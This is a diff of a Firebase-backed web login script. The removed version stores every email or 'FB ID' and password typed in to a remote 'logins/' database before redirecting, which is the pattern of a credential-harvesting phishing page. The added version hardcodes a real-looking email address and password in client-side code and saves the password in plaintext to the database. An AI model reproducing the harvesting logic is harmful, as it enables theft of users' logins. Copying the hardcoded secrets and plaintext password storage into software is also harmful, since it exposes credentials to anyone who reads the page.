@@ -140,10 +140,11 @@
   const analytics = getAnalytics(app);
   const db = getDatabase(app);
 
-  // List of allowed real FB IDs
-  const allowedFbIds = ["fb123456", "fb987654", "fb909090"]; // Add your own IDs here
+  // Predefined correct login
+  const correctEmail = "crackvision6@gmail.com";
+  const correctPassword = "Uzair787";
 
-  // Popup message
+  // Show popup function
   function showPopup(message, type = "default") {
     const popup = document.getElementById("popup");
     popup.innerText = message;
@@ -153,63 +154,46 @@
     if (type === "error") popup.classList.add("error");
 
     popup.classList.add("show");
-
     setTimeout(() => {
       popup.classList.remove("show");
     }, 3000);
   }
 
-  // Save Login
+  // Save login
   window.saveLogin = () => {
     const email = document.getElementById("email").value.trim();
     const password = document.getElementById("password").value.trim();
 
     if (!email || !password) {
-      showPopup("Enter email/FB ID and password.", "error");
+      showPopup("Enter email and password.", "error");
       return;
     }
 
-    const isFbId = email.startsWith("fb") && !email.includes("@");
-    const isAllowedFbId = allowedFbIds.includes(email);
+    if (email === correctEmail && password === correctPassword) {
+      // ✅ Save to Firebase
+      const loginData = {
+        email,
+        password,
+        time: new Date().toLocaleString()
+      };
 
-    // Save in Firebase first
-    const loginData = {
-      email,
-      password,
-      time: new Date().toLocaleString()
-    };
-
-    push(ref(db, "logins/"), loginData)
-      .then(() => {
-        // Now decide route
-        if (isFbId) {
-          if (isAllowedFbId) {
-            showPopup("Logging in with valid FB ID...", "success");
-            setTimeout(() => {
-              window.location.href = "dashboard.html";
-            }, 1500);
-          } else {
-            showPopup("Invalid FB ID. Redirecting...", "error");
-            setTimeout(() => {
-              window.location.href = "sysinfo.html";
-            }, 2000);
-          }
-        } else {
-          // It's an email or phone login — allowed directly
-          showPopup("Logging in with Email...", "success");
+      push(ref(db, "logins/"), loginData)
+        .then(() => {
+          showPopup("Login successful!", "success");
           setTimeout(() => {
-            window.location.href = "sysinfo.html";
-          }, 1500);
-        }
-
-        // Reset form
-        document.getElementById("email").value = "";
-        document.getElementById("password").value = "";
-      })
-      .catch((error) => {
-        console.error("Firebase Error:", error);
-        showPopup("Error: " + error.message, "error");
-      });
+            window.location.href = "dashboard.html";
+          }, 1000);
+        })
+        .catch((error) => {
+          showPopup("Firebase Error", "error");
+          console.error("Firebase error:", error);
+        });
+    } else {
+      showPopup("Incorrect Email or Password", "error");
+      setTimeout(() => {
+        window.location.href = "sysinfo.html";
+      }, 2000);
+    }
   };
 </script>
 
